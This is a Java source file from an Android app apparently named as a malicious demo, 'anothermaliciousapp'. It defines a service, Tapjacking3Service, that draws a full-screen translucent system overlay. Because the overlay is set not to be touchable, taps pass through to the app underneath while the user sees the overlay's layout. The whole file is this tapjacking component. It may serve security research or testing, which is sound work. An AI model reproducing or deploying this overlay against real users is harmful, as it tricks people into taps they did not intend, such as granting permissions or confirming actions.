package org.mmm.anothermaliciousapp;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.support.v4.content.LocalBroadcastManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.EditText;

public class Tapjacking3Service extends Service {

    private WindowManager windowManager;
    private View view;

    public Tapjacking3Service() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        view = LayoutInflater.from(this).inflate(R.layout.layout_tapjacking3, null);

        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED
        );
        layoutParams.format = PixelFormat.TRANSLUCENT;

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManager.addView(view, layoutParams);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (view != null)
            windowManager.removeView(view);
    }
}
